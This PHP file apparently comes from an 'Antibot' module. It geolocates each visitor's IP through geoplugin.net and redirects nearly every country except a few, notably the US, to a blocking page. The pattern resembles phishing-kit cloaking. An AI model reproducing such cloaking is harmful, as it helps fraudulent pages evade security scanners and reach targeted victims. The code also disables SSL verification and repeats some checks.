<?php
$tanitatikaram = parse_ini_file("Anticonfig.ini", true);
$setting_country = $tanitatikaram['country'];
if ($setting_country == 'on') {
    $ip = getenv("REMOTE_ADDR");
    $url = "http://www.geoplugin.net/json.gp?ip=" . $ip;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $resp = curl_exec($ch);
    curl_close($ch);
    $details = json_decode($resp, true);
    $countrycode = $details['geoplugin_countryCode'];
if ($countrycode == "NL") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "A1") {
   header('Location: Antibot/country.php');
} 
else if ($countrycode == "AD") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "AE") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "AF") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "AG") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "AI") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "AL") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "AM") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "AN") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "AO") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "AP") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "AQ") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "AR") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "AS") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "AT") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "AU") {
   header('Location: Antibot/country.php');
} else if ($countrycode == "AW") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "AX") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "AZ") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "BA") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "BB") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "BD") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "BE") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "BD") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "BE") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "BF") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "BG") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "BH") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "BI") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "BJ") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "BM") {
   header('Location: Antibot/country.php');
} 
else if ($countrycode == "BN") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "BO") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "BR") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "BS") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "BT") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "BV") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "BV") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "BW") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "BY") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "BZ") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "CA") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "CC") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "CD") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "CF") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "CG") {
   header('Location: Antibot/country.php');
} else if ($countrycode == "CH") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "CI") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "CK") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "CL") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "CM") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "CN") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "CO") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "CR") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "CU") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "CV") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "CX") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "CY") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "CZ") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "DE") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "DJ") {
   header('Location: Antibot/country.php');
} else if ($countrycode == "DK") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "DM") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "DO") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "DZ") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "EC") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "EE") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "EG") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "EH") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "ER") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "ES") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "ET") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "EU") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "FI") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "FJ") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "FK") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "FM") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "FO") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "FR") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "GA") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "GB") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "GD") {
   header('Location: Antibot/country.php');
} else if ($countrycode == "GE") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "GF") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "GG") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "GH") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "GI") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "GL") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "GM") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "GN") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "GP") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "GQ") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "GR") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "GS") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "GT") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "GU") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "GW") {
   header('Location: Antibot/country.php');
} 
else if ($countrycode == "GY") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "HK") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "HM") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "HN") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "HR") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "HT") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "HU") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "ID") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "IE") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "IL") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "IM") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "IN") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "IO") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "IQ") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "IR") {
   header('Location: Antibot/country.php');
} else if ($countrycode == "IS") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "IT") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "JE") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "JM") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "JO") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "JP") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "KE") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "KG") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "KH") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "KI") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "KM") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "KN") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "KP") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "KR") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "KW") {
   header('Location: Antibot/country.php');
} 
else if ($countrycode == "KY") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "KZ") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "LA") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "LB") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "LC") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "LI") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "LK") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "LR") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "LS") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "LT") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "LU") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "LV") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "LY") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "MA") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "MC") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "MD") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "ME") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "MG") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "MH") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "MK") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "ML") {
   header('Location: Antibot/country.php');
} else if ($countrycode == "MM") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "MN") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "MO") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "MP") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "MQ") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "MR") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "MQ") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "MR") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "MS") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "MT") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "MU") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "MV") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "MW") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "MX") {
   header('Location: Antibot/country.php');
}else if ($countrycode == "MY") {
   header('Location: Antibot/country.php');
} else if ($countrycode == "MZ") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "NA") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "NC") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "NE") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "NF") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "NG") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "NI") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "NO") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "NP") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "NR") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "NU") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "NZ") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "OM") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "PA") {
   header('Location: Antibot/country.php');
} 
else if ($countrycode == "PE") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "PF") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "PG") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "PH") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "PK") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "PL") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "PM") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "PN") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "PR") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "PS") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "PT") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "PW") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "PY") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "QA") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "RE") {
   header('Location: Antibot/country.php');
} else if ($countrycode == "RO") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "RS") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "RU") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "RW") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "SA") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "SB") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "SC") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "SD") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "SE") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "SG") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "SH") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "SI") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "SJ") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "SK") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "SL") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "SM") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "SN") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "SO") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "SR") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "ST") {
   header('Location: Antibot/country.php');
} else if ($countrycode == "SV") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "SY") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "SZ") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "TC") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "TD") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "TF") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "TG") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "TH") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "TJ") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "TK") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "TL") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "TM") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "TN") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "TO") {
   header('Location: Antibot/country.php');
}else if ($countrycode == "TR") {
   header('Location: Antibot/country.php');
} else if ($countrycode == "TT") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "TV") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "TW") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "TZ") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "UA") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "UG") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "UM") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "UY") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "UZ") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "VA") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "VC") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "VE") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "VG") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "VI") {
   header('Location: Antibot/country.php');
} else if ($countrycode == "VN") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "VU") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "WF") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "WS") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "YE") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "YT") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "ZA") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "ZM") {
   header('Location: Antibot/country.php');
}
else if ($countrycode == "ZW") {
   header('Location: Antibot/country.php');
}
};
?>